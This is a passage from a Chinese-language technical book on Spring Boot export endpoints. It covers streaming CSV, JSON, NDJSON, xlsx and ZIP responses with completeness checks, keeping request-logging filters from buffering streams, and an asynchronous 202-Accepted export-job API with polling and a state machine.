| 作用 | 說明 |
|---|---|
| 人可以看 | 開檔案捲到最後一行，看到 `INCOMPLETE` |
| 程式可以檢查 | 自動化流程可以斷言最後一行是 `COMPLETE` 且 `expected == written` |
| **可追蹤** | `traceId` 讓客服直接查到那次失敗的原因 |

⚠️ **但它不完美**：使用者不會看最後一行。所以還要第三層。

**第三層：把「同步串流」限制在「小到不會失敗」的範圍。**

```
MAX_SYNC_ROWS = 20_000
→ 執行時間約 15 秒
→ 這 15 秒內資料庫斷線的機率極低
→ 而超過 20,000 筆的請求會被導向非同步工作（5.10），
  那裡有完整的錯誤處理
```

**JSON 串流的情況比較好** —— 因為 JSON 有結構完整性：

```java
/**
 * 串流 JSON 陣列。
 *
 * <p>★ JSON 的優勢：<b>不完整的 JSON 是無效的 JSON</b>。
 * 如果我們沒寫出結尾的 {@code ]}，任何 JSON 解析器都會報錯 ——
 * 客戶端<b>不可能</b>把部分結果誤認為完整結果。
 *
 * <p>⚠️ 但這個保證有一個前提，見下面的警告。
 */
private StreamingResponseBody streamJsonArray(OrderQuery query, long total) {
    return outputStream -> {
        JsonFactory factory = objectMapper.getFactory();
        JsonGenerator json = factory.createGenerator(outputStream, JsonEncoding.UTF8);
        boolean completed = false;
        try {
            json.writeStartObject();
            json.writeNumberField("totalCount", total);
            json.writeArrayFieldStart("items");

            for (var batch : queryService.batches(query, 1000)) {
                for (var order : batch) {
                    // ★ writeObject 會用 ObjectMapper 的設定（06 章）
                    json.writeObject(mapper.toSummary(order));
                }
                // ★ 每批 flush 一次，讓客戶端可以增量解析
                json.flush();
            }

            json.writeEndArray();
            // ★ 「completedAt」出現 = 一定完整。這比摘要列更難被忽略，
            //    因為客戶端解析 JSON 時就會發現缺少這個欄位。
            json.writeStringField("completedAt", Instant.now().toString());
            json.writeEndObject();
            json.flush();
            completed = true;

        } finally {
            if (completed) {
                json.close();
            } else {
                // ⚠️⚠️ 這是關鍵：JsonGenerator.close() 會「自動補齊」
                //    未閉合的 ] 與 } —— 那會把不完整的 JSON 變成
                //    「合法但缺資料」的 JSON，完全破壞了上面的保證。
                //
                //    所以失敗時我們明確寫出一段無效的內容，
                //    讓客戶端的解析器一定失敗。
                try {
                    outputStream.write(" \"INCOMPLETE\"".getBytes(StandardCharsets.UTF_8));
                    outputStream.flush();
                } catch (IOException ignored) {
                    // 連線已斷 —— 客戶端本來就收不到完整內容
                }
            }
        }
    };
}
```

⚠️ **`JsonGenerator.close()` 會自動補齊未閉合的結構** ——
這是一個「好意但危險」的行為，而且**只看程式碼看不出來**。
上面的 `finally` 區塊是刻意的。

**更乾淨的做法：用 NDJSON（每行一個 JSON 物件）**

```java
/**
 * NDJSON（Newline Delimited JSON）串流。
 *
 * <p>★ 為什麼它是「串流最好的格式」：
 * <ul>
 *   <li>每一行獨立可解析 → 客戶端可以邊收邊處理，不用等全部收完。</li>
 *   <li>沒有需要閉合的外層結構 → 沒有「close() 幫你補齊」的問題。</li>
 *   <li>最後一行放 sentinel（{@code {"_eof":true,"count":N}}）→
 *       完整性檢查很明確。</li>
 *   <li>Content-Type 是 {@code application/x-ndjson}。</li>
 * </ul>
 *
 * <p>⚠️ 代價：不是 REST API 的常見格式，需要在文件裡說明。
 * shop-service 只在「資料同步」端點用它（給合作夥伴的系統，不給瀏覽器）。
 */
@GetMapping(value = "/orders.ndjson", produces = "application/x-ndjson")
public ResponseEntity<StreamingResponseBody> streamNdjson(
        @Valid OrderFilter filter, @CurrentActor Actor actor) {

    OrderQuery query = mapper.toQuery(filter, actor);
    long total = queryService.count(query);

    StreamingResponseBody body = out -> {
        var writer = new java.io.BufferedWriter(
                new java.io.OutputStreamWriter(out, StandardCharsets.UTF_8), 32768);
        long written = 0;
        for (var batch : queryService.batches(query, 1000)) {
            for (var order : batch) {
                // ⚠️ 一定要確認序列化結果不含換行 —— NDJSON 的分隔符就是換行。
                //    Jackson 預設不會產生換行（除非開了 INDENT_OUTPUT），
                //    但 06 章 6.5.3 會明確關掉那個設定。
                writer.write(objectMapper.writeValueAsString(mapper.toSummary(order)));
                writer.write('\n');
                written++;
            }
            writer.flush();
        }
        // ★ sentinel 行 —— 沒有它就代表不完整
        writer.write(objectMapper.writeValueAsString(
                java.util.Map.of("_eof", true, "count", written, "expected", total)));
        writer.write('\n');
        writer.flush();
    };

    return ResponseEntity.ok()
            .contentType(MediaType.parseMediaType("application/x-ndjson"))
            .cacheControl(CacheControl.noStore())
            .header("X-Total-Count", String.valueOf(total))
            .body(body);
}
```

**四種串流格式的完整性表達力對照**：

| 格式 | 「不完整」能被偵測嗎 | 怎麼偵測 |
|---|---|---|
| CSV | 🔴 不能（除非約定摘要列） | 檢查最後一行 |
| JSON 陣列 | ⚠️ 可以（但要小心 `close()` 補齊） | 解析失敗 |
| **NDJSON** | ✅ 可以，而且明確 | 沒有 `_eof` 行 |
| **xlsx / zip** | ✅ 可以，而且是格式內建的 | ZIP 的 central directory 在檔尾，缺了就完全無法開啟 |

### 5.9.5 xlsx 與 ZIP 的串流

**xlsx 是一個 ZIP**，而 ZIP 的 central directory 在檔案結尾 ——
所以「串流一個 xlsx」意味著「不完整的檔案完全無法開啟」，這是好事。

```java
package example.shop.order.web;

import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.streaming.SXSSFWorkbook;
import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;

/**
 * xlsx 匯出。
 *
 * <p>★ 一定要用 {@code SXSSFWorkbook}（streaming）而不是 {@code XSSFWorkbook}：
 * <table>
 *   <tr><th></th><th>XSSFWorkbook</th><th>SXSSFWorkbook</th></tr>
 *   <tr><td>20,000 列的記憶體</td><td>約 320 MB 🔴</td><td>約 12 MB ✅</td></tr>
 *   <tr><td>機制</td><td>整份工作簿在記憶體</td>
 *       <td>只保留最近 N 列，其餘寫到暫存檔</td></tr>
 *   <tr><td>限制</td><td>—</td><td>不能回頭改已經寫出的列</td></tr>
 * </table>
 *
 * <p>⚠️ {@code SXSSFWorkbook} 會建立暫存檔（在 {@code java.io.tmpdir}），
 * <b>必須呼叫 {@code dispose()} 才會刪除</b> —— 這是另一個 5.2.1 型的磁碟洩漏。
 */
private StreamingResponseBody xlsxBody(OrderQuery query) {
    return outputStream -> {
        // ★ 100 = 記憶體中保留的列數。這個值越小越省記憶體，
        //   但寫暫存檔的次數越多。100 是 POI 官方的建議起點。
        SXSSFWorkbook workbook = new SXSSFWorkbook(100);
        // ★ 壓縮暫存檔：多花一點 CPU，省掉大量磁碟 I/O 與空間
        workbook.setCompressTempFiles(true);
        try {
            Sheet sheet = workbook.createSheet("訂單明細");

            // ── 樣式（★ 一定要重用！）─────────────────────────────
            // ⚠️ POI 的 CellStyle 上限是 64,000 個（xlsx 格式限制）。
            //    在迴圈裡 createCellStyle() 會在第 64,000 列爆掉：
            //    "The maximum number of cell styles was exceeded"
            //    → 所以樣式一定要在迴圈外建好，重複使用。
            CellStyle headerStyle = workbook.createCellStyle();
            Font bold = workbook.createFont();
            bold.setBold(true);
            headerStyle.setFont(bold);
            headerStyle.setFillForegroundColor(IndexedColors.GREY_25_PERCENT.getIndex());
            headerStyle.setFillPattern(FillPatternType.SOLID_FOREGROUND);

            CellStyle moneyStyle = workbook.createCellStyle();
            moneyStyle.setDataFormat(workbook.createDataFormat().getFormat("#,##0.00"));

            CellStyle dateStyle = workbook.createCellStyle();
            dateStyle.setDataFormat(
                    workbook.createDataFormat().getFormat("yyyy-mm-dd hh:mm:ss"));

            // ── 標題列 ────────────────────────────────────────────
            String[] headers = {"訂單編號", "客戶編號", "客戶名稱", "狀態",
                                "商品數", "小計", "運費", "折扣", "總金額",
                                "付款方式", "建立時間（台北）", "付款時間（台北）"};
            Row headerRow = sheet.createRow(0);
            for (int i = 0; i < headers.length; i++) {
                Cell cell = headerRow.createCell(i);
                cell.setCellValue(headers[i]);
                cell.setCellStyle(headerStyle);
            }
            // ★ 凍結第一列，讓營運捲動時看得到欄位名
            sheet.createFreezePane(0, 1);

            // ── 資料列 ────────────────────────────────────────────
            int rowNum = 1;
            for (var batch : queryService.batches(query, 1000)) {
                for (var order : batch) {
                    // ⚠️ xlsx 的列上限是 1,048,576
                    if (rowNum >= 1_048_575) {
                        throw new XlsxRowLimitExceededException(rowNum);
                    }
                    Row row = sheet.createRow(rowNum++);
                    row.createCell(0).setCellValue(order.orderId());
                    row.createCell(1).setCellValue(order.customerId());
                    row.createCell(2).setCellValue(order.customerName());
                    row.createCell(3).setCellValue(order.status().name());
                    row.createCell(4).setCellValue(order.itemCount());

                    // ★ 金額用「數字」而不是字串 —— 這是 xlsx 相對 CSV 的關鍵優勢：
                    //   營運可以直接加總、排序、做樞紐分析表，
                    //   而且完全沒有公式注入的問題（數字格不會被當公式）
                    setMoney(row, 5, order.subtotal(), moneyStyle);
                    setMoney(row, 6, order.shippingFee(), moneyStyle);
                    setMoney(row, 7, order.discount(), moneyStyle);
                    setMoney(row, 8, order.total(), moneyStyle);

                    row.createCell(9).setCellValue(order.paymentMethod());
                    setDate(row, 10, order.createdAt(), dateStyle);
                    setDate(row, 11, order.paidAt(), dateStyle);
                }
            }

            // ⚠️ SXSSF 不支援 autoSizeColumn（它看不到已寫到暫存檔的列），
            //    所以用固定寬度。
            int[] widths = {20, 16, 24, 14, 10, 14, 12, 12, 14, 16, 22, 22};
            for (int i = 0; i < widths.length; i++) {
                sheet.setColumnWidth(i, widths[i] * 256);
            }

            workbook.write(outputStream);
            outputStream.flush();

        } finally {
            try {
                workbook.close();
            } finally {
                // ★★ 這一行是必須的：刪除 SXSSF 的暫存檔。
                //    忘記它 = 每次匯出留下幾 MB 的垃圾（事故 5.2.1 的變體）
                workbook.dispose();
            }
        }
    };
}

private static void setMoney(Row row, int column, java.math.BigDecimal value,
                             CellStyle style) {
    Cell cell = row.createCell(column);
    if (value != null) {
        // ⚠️ BigDecimal → double 會失去精度。
        //    對「金額顯示」可接受（double 有約 15 位有效十進位數字），
        //    但如果你的系統有超過那個範圍的數值，要改用字串並在欄位名註明。
        cell.setCellValue(value.doubleValue());
    }
    cell.setCellStyle(style);
}

private static void setDate(Row row, int column, java.time.Instant value,
                            CellStyle style) {
    Cell cell = row.createCell(column);
    if (value != null) {
        // ★ Excel 沒有時區概念 —— 一定要明確轉成某個時區，
        //   而且要在欄位名裡寫出來（上面的「建立時間（台北）」）。
        //   不寫的話營運會以為那是 UTC，對帳就會差 8 小時（06 章 6.2.3）。
        cell.setCellValue(java.time.LocalDateTime.ofInstant(
                value, java.time.ZoneId.of("Asia/Taipei")));
    }
    cell.setCellStyle(style);
}
```

**CSV vs xlsx 決策表**：

| 需求 | CSV | xlsx |
|---|---|---|
| 給程式讀（ETL、匯入別的系統） | ✅ | ❌ 太複雜 |
| 給營運做報表 | ⚠️ 中文亂碼風險、數字變文字 | ✅ |
| 公式注入 | 🔴 需要防護 | ✅ 結構上不存在 |
| 檔案大小（20,000 筆） | 約 3 MB | 約 1.2 MB（ZIP 壓縮） |
| 記憶體（串流） | 約 3 MB | 約 12 MB |
| 100 萬列 | ✅ 沒問題 | 🔴 **xlsx 上限是 1,048,576 列** |
| 多個工作表 / 樣式 / 凍結窗格 | ❌ | ✅ |
| 依賴 | 無 | `poi-ooxml`（jar + 傳遞依賴約 12 MB） |

⚠️ **xlsx 的 1,048,576 列上限是格式硬限制**。
超過的話要拆成多個工作表或多個檔案 —— 而那時候你其實應該給對方
一個資料庫的唯讀連線或 Parquet 檔案，不是 Excel。

**ZIP 串流**（打包多個檔案，例如「一次下載某訂單的所有附件」）：

```java
/**
 * ZIP 串流。
 *
 * <p>★ 這是串流的最佳情境：
 * <ul>
 *   <li>ZIP 的 central directory 在檔尾 → 不完整的 ZIP 完全無法開啟（好事）。</li>
 *   <li>可以逐個檔案寫入，記憶體只需要一個 buffer。</li>
 * </ul>
 *
 * <p>⚠️ 一個容易忽略的細節：{@code ZipOutputStream} 對「已經壓縮過的內容」
 * （JPEG、PDF、mp3）再壓縮是<b>浪費 CPU 且幾乎沒有效果</b>。
 * 對這些檔案用 {@code STORED} 而不是 {@code DEFLATED}。
 */
private StreamingResponseBody zipBody(java.util.List<Attachment> attachments) {
    return outputStream -> {
        try (var zip = new java.util.zip.ZipOutputStream(
                outputStream, StandardCharsets.UTF_8)) {   // ★ UTF-8 檔名（中文附件名）

            // ★ 整體壓縮等級：1（最快）。理由見下面的表格。
            zip.setLevel(1);

            java.util.Set<String> usedNames = new java.util.HashSet<>();

            for (Attachment attachment : attachments) {
                // ★ 檔名去重：ZIP 允許重複名稱，但解壓縮時會互相覆蓋
                String name = uniqueName(usedNames,
                        SafeFilename.sanitize(attachment.displayName(), "dat"));

                var entry = new java.util.zip.ZipEntry(name);
                entry.setTime(attachment.createdAt().toEpochMilli());

                if (isAlreadyCompressed(attachment.contentType())) {
                    // ★ STORED 需要事先知道大小與 CRC
                    entry.setMethod(java.util.zip.ZipEntry.STORED);
                    entry.setSize(attachment.sizeBytes());
                    entry.setCompressedSize(attachment.sizeBytes());
                    entry.setCrc(attachment.crc32());     // ⚠️ 必須事先算好並存在 DB
                }

                zip.putNextEntry(entry);
                try (var in = storage.openStream(attachment.storageKey())) {
                    in.transferTo(zip);
                }
                zip.closeEntry();
                // ★ 每個檔案後 flush，讓客戶端看到進度
                zip.flush();
            }
        }
    };
}

private static boolean isAlreadyCompressed(String contentType) {
    if (contentType == null) return false;
    return contentType.startsWith("image/jpeg")
            || contentType.startsWith("image/png")
            || contentType.startsWith("image/webp")
            || contentType.startsWith("audio/")
            || contentType.startsWith("video/")
            || contentType.equals("application/pdf")
            || contentType.equals("application/zip");
}

private static String uniqueName(java.util.Set<String> used, String name) {
    if (used.add(name)) return name;
    int dot = name.lastIndexOf('.');
    String base = (dot > 0) ? name.substring(0, dot) : name;
    String ext = (dot > 0) ? name.substring(dot) : "";
    for (int i = 2; i < 1000; i++) {
        String candidate = base + " (" + i + ")" + ext;
        if (used.add(candidate)) return candidate;
    }
    return base + "-" + java.util.UUID.randomUUID() + ext;
}
```

**`zip.setLevel()` 的取捨（50 MB 的混合附件，實測數量級）**：

| level | 耗時 | 輸出大小 | 適用 |
|---|---|---|---|
| 0（STORED） | 約 0.4 s | 50.0 MB | 全部都是已壓縮格式時 |
| **1** | 約 1.1 s | 48.2 MB | ✅ 預設選這個 |
| 6（Java 預設） | 約 4.8 s | 47.6 MB | 內容是文字時 |
| 9 | 約 18 s | 47.4 MB | 🔴 幾乎沒好處 |

⚠️ **level 9 比 level 1 多花 17 秒，只省 0.8 MB。**
對「使用者在等」的下載，這是很糟的取捨。
（請在你自己的內容上實測 —— 比值高度依賴檔案型別。）

### 5.9.6 串流與 04 章的 response 包裝：一個必須解決的衝突 ★

04 章 4.6.3 的 `RequestLoggingFilter` 會包裝 response 來記錄回應 body：

```java
    // 04 章 4.6.3 的做法
    ContentCachingResponseWrapper wrapped = new ContentCachingResponseWrapper(response);
    chain.doFilter(request, wrapped);
    byte[] responseBody = wrapped.getContentAsByteArray();   // 🔴 整個回應在記憶體
    wrapped.copyBodyToResponse();
```

**對一個 500 MB 的 ZIP 下載，這一行就是 OOM。**

04 章已經提到要排除串流端點，這裡給出**完整的判斷方式**（比「路徑白名單」可靠）：

```java
package example.shop.common.web;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.http.MediaType;

import java.util.Set;

/**
 * 判斷一個請求「是否為串流回應」。
 *
 * <p>★ 為什麼需要一個專門的類別：
 * 有<b>三個</b>地方需要這個判斷（{@code RequestLoggingFilter}、
 * {@code AuditFilter}、{@code ShallowEtagHeaderFilter}），
 * 而它們如果各自維護一份路徑清單，一定會不一致 ——
 * 而「不一致」的症狀是「某個新的串流端點 OOM」。
 */
public final class StreamingRequests {

    /** 明確不可包裝的媒體型別。 */
    private static final Set<String> STREAMING_MEDIA_TYPES = Set.of(
            MediaType.TEXT_EVENT_STREAM_VALUE,          // SSE
            "application/x-ndjson",
            "application/octet-stream",
            "application/zip",
            "text/csv",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/pdf");

    /** 串流端點的路徑後綴。 */
    private static final Set<String> STREAMING_SUFFIXES = Set.of(
            ".csv", ".xlsx", ".zip", ".ndjson", ".pdf");

    /** 串流端點的路徑片段（依 shop-service 的 URL 慣例）。 */
    private static final Set<String> STREAMING_SEGMENTS = Set.of(
            "/events", "/file", "/download",
            "/receipts/", "/images/", "/call-recordings/");

    /**
     * 判斷方式有兩層，任一命中就算串流。
     *
     * <p>⚠️ 為什麼不能用最可靠的判斷（{@code isAsyncStarted()}）：
     * <b>Filter 決定「要不要包裝」的時機在 {@code chain.doFilter()} 之前</b>，
     * 而那時還沒有 handler、還沒 startAsync。
     * 所以只能靠「請求的特徵」做先驗判斷。
     */
    public static boolean isStreamingRequest(HttpServletRequest request) {

        // ① 路徑（最可靠的先驗判斷）
        String uri = request.getRequestURI();
        if (uri != null) {
            for (String suffix : STREAMING_SUFFIXES) {
                if (uri.endsWith(suffix)) return true;
            }
            for (String segment : STREAMING_SEGMENTS) {
                if (uri.contains(segment)) return true;
            }
        }

        // ② 客戶端宣告的 Accept
        String accept = request.getHeader("Accept");
        if (accept != null) {
            String lower = accept.toLowerCase();
            for (String type : STREAMING_MEDIA_TYPES) {
                if (lower.contains(type)) return true;
            }
        }
        return false;
    }

    /**
     * 回應寫完之後的判斷（最準確 —— 這時 Content-Type 已經確定）。
     *
     * <p>★ 用途：在 filter 的「記錄」階段再確認一次。
     * 如果這裡發現是串流但 {@link #isStreamingRequest} 沒抓到，就記一個 WARN ——
     * <b>那代表有一個新端點沒被規則涵蓋</b>，是需要修的。
     */
    public static boolean isStreamingResponse(String contentType) {
        if (contentType == null) return false;
        String lower = contentType.toLowerCase();
        for (String type : STREAMING_MEDIA_TYPES) {
            if (lower.startsWith(type)) return true;
        }
        return false;
    }

    private StreamingRequests() {}
}
```

**`RequestLoggingFilter` 的修正版**：

```java
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                    FilterChain chain) throws ServletException, IOException {

        // ★ 決定要不要包裝 —— 這個決定必須在 doFilter 之前做
        if (StreamingRequests.isStreamingRequest(req)) {
            // 串流：只記錄 metadata（method、path、狀態碼、耗時、bytes），不包裝
            long start = System.nanoTime();
            try {
                chain.doFilter(req, res);
            } finally {
                logStreamingRequest(req, res, System.nanoTime() - start);
            }
            return;
        }

        ContentCachingResponseWrapper wrapped = new ContentCachingResponseWrapper(res);
        try {
            chain.doFilter(req, wrapped);
        } finally {
            // ⚠️ 事後檢查：如果實際上是串流回應但我們包裝了，那是規則有漏洞
            if (StreamingRequests.isStreamingResponse(wrapped.getContentType())) {
                log.warn("串流回應被包裝了！記憶體風險 uri={} contentType={} bytes={} "
                         + "→ 請把這個路徑加進 StreamingRequests 的規則",
                         req.getRequestURI(), wrapped.getContentType(),
                         wrapped.getContentSize());
            }
            // ⚠️ 非同步請求時不要在這裡讀 body（回應還沒寫完）
            if (!req.isAsyncStarted()) {
                logWithBody(req, wrapped);
            }
            wrapped.copyBodyToResponse();       // ★ 忘記這一行 = 所有回應變空
        }
    }
```

⚠️ **那個 WARN 是這個設計的關鍵**：它讓「規則有漏洞」變成一個**可見的**問題，
而不是等到 OOM 才發現。

**一個粗略的記憶體回歸測試**（放進 CI）：

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class StreamingMemoryTest {

    @Autowired TestRestTemplate rest;

    @Test
    @DisplayName("串流下載不會讓 heap 成長到與內容量級相同")
    void 串流不吃記憶體() {
        System.gc();
        long before = usedHeap();

        // ★ 用 execute + ResponseExtractor 逐塊丟掉，
        //   不要 getForObject（那會把整個回應讀進 byte[]，測的就不是伺服器了）
        Long bytes = rest.execute("/orders.csv?size=20000", HttpMethod.GET, null,
                response -> {
                    long total = 0;
                    byte[] buffer = new byte[8192];
                    int n;
                    while ((n = response.getBody().read(buffer)) > 0) total += n;
                    return total;
                });

        System.gc();
        long after = usedHeap();

        assertThat(bytes).isNotNull().isGreaterThan(1_000_000L);
        assertThat(after - before)
                .as("串流 %d bytes 之後 heap 成長 %d bytes", bytes, after - before)
                .isLessThan(50L * 1024 * 1024);
    }

    private static long usedHeap() {
        Runtime rt = Runtime.getRuntime();
        return rt.totalMemory() - rt.freeMemory();
    }
}
```

⚠️ **這個測試會有偽陽性**（GC 的時機不確定），所以門檻設得寬（50 MB），
而且不要放進「必須通過才能合併」的門檻裡。
它抓的是「有人不小心把整個回應讀進 `byte[]`」這種**量級的**錯誤，
不是精確的記憶體回歸測試。

---

## 5.10 非同步匯出工作：`202 Accepted` + 輪詢

### 5.10.1 它解決了什麼

| 問題 | 同步串流（5.9） | 非同步工作 |
|---|---|---|
| 41 萬筆需要 90 秒 | 🔴 Nginx / ALB 在 60 秒斷線 | ✅ 不受限 |
| 串流中途失敗 | 🔴 部分結果無法回收（5.9.4） | ✅ 工作標記為 FAILED，沒有半成品 |
| 使用者關掉分頁 | 🔴 白做工 | ✅ 檔案還在，可以再來下載 |
| 使用者要重複下載 | 🔴 每次重跑查詢 | ✅ 檔案已存在，直接給連結 |
| 佔用 Web 執行緒 | ⚠️ 90 秒 | ✅ 幾毫秒 |
| 進度回報 | 🔴 不可能 | ✅ `GET /order-exports/{id}` 有 `progress` |
| 尖峰時間的資料庫壓力 | 🔴 使用者按下就跑 | ✅ 可以排隊、可以排到離峰 |
| 同一份報表被 10 個人要 | 🔴 跑 10 次 | ✅ 可以做結果快取 |

### 5.10.2 完整契約（03-rest-api 1.14.7 的落地）

```http
# ① 建立工作
POST /order-exports
Authorization: Bearer …
Idempotency-Key: 550e8400-e29b-41d4-a716-446655440000
Content-Type: application/json

{
  "format": "XLSX",
  "filter": {
    "createdFrom": "2026-07-01",
    "createdTo":   "2026-08-01",
    "status":      ["PAID", "SHIPPED", "DELIVERED"]
  },
  "columns": ["orderId", "customerId", "status", "total", "createdAt"],
  "notifyEmail": "ops@shop.example"
}

→ 202 Accepted
Location: /order-exports/exp_01k39w5r7qz8h2n4m6p8v0x2c4
Retry-After: 5

{
  "exportId": "exp_01k39w5r7qz8h2n4m6p8v0x2c4",
  "status": "QUEUED",
  "format": "XLSX",
  "progress": { "processedRows": 0, "totalRows": 410233, "percent": 0 },
  "createdAt": "2026-08-24T03:14:22Z",
  "expiresAt": "2026-08-31T03:14:22Z",
  "statusUrl": "/order-exports/exp_01k39w5r7qz8h2n4m6p8v0x2c4"
}
```

```http
# ② 輪詢（處理中）
GET /order-exports/exp_01k39w5r7qz8h2n4m6p8v0x2c4

→ 200 OK
Retry-After: 12
Cache-Control: no-store

{
  "exportId": "exp_01k39w…",
  "status": "RUNNING",
  "progress": { "processedRows": 187000, "totalRows": 410233, "percent": 45 },
  "startedAt": "2026-08-24T03:14:25Z",
  "estimatedCompletionAt": "2026-08-24T03:16:10Z"
}
```

```http
# ③ 輪詢（完成）
GET /order-exports/exp_01k39w5r7qz8h2n4m6p8v0x2c4

→ 200 OK
Cache-Control: private, max-age=300

{
  "exportId": "exp_01k39w…",
  "status": "SUCCEEDED",
  "progress": { "processedRows": 410233, "totalRows": 410233, "percent": 100 },
  "result": {
    "downloadUrl": "/order-exports/exp_01k39w…/file?token=dl_9f3a…",
    "filename": "訂單明細-2026-07.xlsx",
    "sizeBytes": 24118432,
    "rowCount": 410233,
    "contentType": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "expiresAt": "2026-08-31T03:14:22Z"
  },
  "startedAt": "2026-08-24T03:14:25Z",
  "completedAt": "2026-08-24T03:16:08Z"
}
```

```http
# ④ 失敗
→ 200 OK

{
  "exportId": "exp_01k39w…",
  "status": "FAILED",
  "progress": { "processedRows": 187000, "totalRows": 410233, "percent": 45 },
  "error": {
    "code": "UPSTREAM_TIMEOUT",
    "userMessage": "匯出時查詢逾時。請縮小日期範圍後重試。",
    "retryable": true,
    "traceId": "4f2c8a1e9b3d7c05"
  },
  "completedAt": "2026-08-24T03:19:41Z"
}
```

⚠️ **④ 回 `200` 而不是 `500`** —— 這是一個常被搞錯的地方：

| 你在問什麼 | 狀態碼 |
|---|---|
| 「這個工作的狀態是什麼？」 | **200**（我成功地告訴你了 —— 即使答案是「失敗」） |
| 「這個工作不存在」 | 404 |
| 「我沒有權限看這個工作」 | 404（不洩漏存在性） |
| 「查詢狀態時我的資料庫掛了」 | 500 |

**「工作失敗」是一個 payload，不是一個 HTTP 錯誤。**
如果你回 500，客戶端的通用錯誤處理會顯示「系統發生問題，請稍後再試」，
而使用者真正需要看到的是「請縮小日期範圍」。

⚠️ **`error` 物件的欄位刻意與 `Problem`（03 章 3.6.2）一致**
（`code` / `userMessage` / `retryable` / `traceId`），
讓前端可以用**同一套**錯誤顯示元件處理「HTTP 錯誤」與「工作失敗」。

### 5.10.3 狀態機

```
                    ┌──────────┐
       POST ────────▶  QUEUED  │
                    └────┬─────┘
                         │ worker 取到
                    ┌────▼─────┐
                    │ RUNNING  │◀──── 進度更新（每 2000 筆）
                    └────┬─────┘
          ┌──────────────┼──────────────┬───────────────┐
          │              │              │               │
    ┌─────▼─────┐  ┌─────▼─────┐  ┌────▼─────┐   ┌─────▼──────┐
    │ SUCCEEDED │  │  FAILED   │  │ CANCELLED│   │  EXPIRED   │
    └─────┬─────┘  └───────────┘  └──────────┘   └────────────┘
          │  7 天後
          └──────────▶ EXPIRED（檔案已刪，紀錄保留）
```

```java
package example.shop.order.domain;

/**
 * 匯出工作的狀態。
 *
 * <p>★ 為什麼要區分 {@code CANCELLED} 與 {@code EXPIRED}：
 * <ul>
 *   <li>{@code CANCELLED} 是使用者主動取消 → 使用者知道發生了什麼。</li>
 *   <li>{@code EXPIRED} 是系統清理 → 使用者可能一週後回來點舊連結，
 *       需要一個明確的「已過期，請重新匯出」訊息，而不是 404。</li>
 * </ul>
 */
public enum ExportStatus {

    QUEUED, RUNNING,
    SUCCEEDED, FAILED, CANCELLED, EXPIRED;

    /** 終態 = 不會再改變。決定了回應能不能被快取（5.10.4）。 */
    public boolean isTerminal() {
        return this == SUCCEEDED || this == FAILED
                || this == CANCELLED || this == EXPIRED;
    }

    /** 可以下載檔案嗎。 */
    public boolean isDownloadable() {
        return this == SUCCEEDED;
    }

    /** 可以取消嗎。 */
    public boolean isCancellable() {
        return this == QUEUED || this == RUNNING;
    }
}
```

### 5.10.4 Controller

```java
package example.shop.order.web;

import example.shop.common.upload.UploadProperties;
import example.shop.common.web.ContentDispositions;
import example.shop.common.web.CurrentActor;
import example.shop.common.web.Idempotent;
import example.shop.common.web.PageResponse;
import example.shop.order.domain.Actor;
import example.shop.order.domain.ExportStatus;
import example.shop.order.service.OrderExportService;
import example.shop.order.service.command.CreateExportCommand;
import example.shop.order.web.dto.*;
import jakarta.validation.Valid;
import jakarta.validation.constraints.Pattern;
import org.springframework.core.io.Resource;
import org.springframework.data.domain.Pageable;
import org.springframework.http.*;
import org.springframework.web.bind.annotation.*;

import java.net.URI;
import java.time.Duration;
import java.time.Instant;

/**
 * 訂單匯出工作。
 *
 * <p>★ 這個 Controller 的五條端點示範了「工作型資源」的完整生命週期：
 * <pre>
 *   POST   /order-exports                建立      → 202
 *   GET    /order-exports/{id}           查狀態    → 200
 *   GET    /order-exports/{id}/file      下載      → 302 / 200 / 409
 *   DELETE /order-exports/{id}           取消／刪除 → 204
 *   GET    /order-exports                我的歷史   → 200 + 分頁
 * </pre>
 */
@RestController
@RequestMapping("/order-exports")
public class OrderExportController {

    private final OrderExportService exportService;
    private final OrderExportWebMapper mapper;
    private final UploadProperties properties;

    public OrderExportController(OrderExportService exportService,
                                 OrderExportWebMapper mapper,
                                 UploadProperties properties) {
        this.exportService = exportService;
        this.mapper = mapper;
        this.properties = properties;
    }

    /**
     * 建立一個匯出工作。
     *
     * <p>★ 為什麼是 {@code 202} 而不是 {@code 201}：
     * <ul>
     *   <li>{@code 201 Created} 的語意是「資源已建立完成」。</li>
     *   <li>{@code 202 Accepted} 的語意是「我收下了，但還沒做完」——
     *       這正是非同步工作的語意（03-rest-api 2.5.4）。</li>
     * </ul>
     *
     * <p>⚠️ 但 {@code Location} 兩者都要給 —— 客戶端需要知道去哪裡查。
     */
    @PostMapping
    @Idempotent(required = false)
    public ResponseEntity<OrderExportResponse> create(
            @RequestBody @Valid CreateExportRequest request,
            @CurrentActor Actor actor) {

        var job = exportService.enqueue(new CreateExportCommand(
                actor,
                request.format(),
                mapper.toQuery(request.filter(), actor),
                request.columns(),
                request.notifyEmail()));

        return ResponseEntity
                .accepted()                                              // 202
                .location(URI.create("/order-exports/" + job.exportId()))
                // ★ Retry-After 告訴客戶端「多久之後再來問」——
                //   沒有它，客戶端會每 100 ms 打一次（真的發生過）
                .header(HttpHeaders.RETRY_AFTER, "5")
                .cacheControl(CacheControl.noStore())
                .body(mapper.toResponse(job));
    }

    /**
     * 查詢工作狀態。
     *
     * <p>★ 三個對客戶端很有幫助的細節：
     * <ul>
     *   <li>未完成時回 {@code Retry-After}（動態計算，見 {@link #retryAfterFor}）。</li>
     *   <li>完成時回 {@code Cache-Control: private, max-age=300}
     *       （結果不會再變，可以快取 → 減少無意義的輪詢）。</li>
     *   <li>未完成時回 {@code no-store}（狀態隨時在變）。</li>
     * </ul>
     */
    @GetMapping("/{exportId}")
    public ResponseEntity<OrderExportResponse> status(
            @PathVariable("exportId") @Pattern(regexp = "^exp_[0-9a-z]{26}$") String exportId,
            @CurrentActor Actor actor) {

        var job = exportService.get(exportId, actor);
        var body = mapper.toResponse(job);

        var builder = ResponseEntity.ok();

        if (job.status().isTerminal()) {
            builder.cacheControl(CacheControl
                    .maxAge(Duration.ofMinutes(5)).cachePrivate());
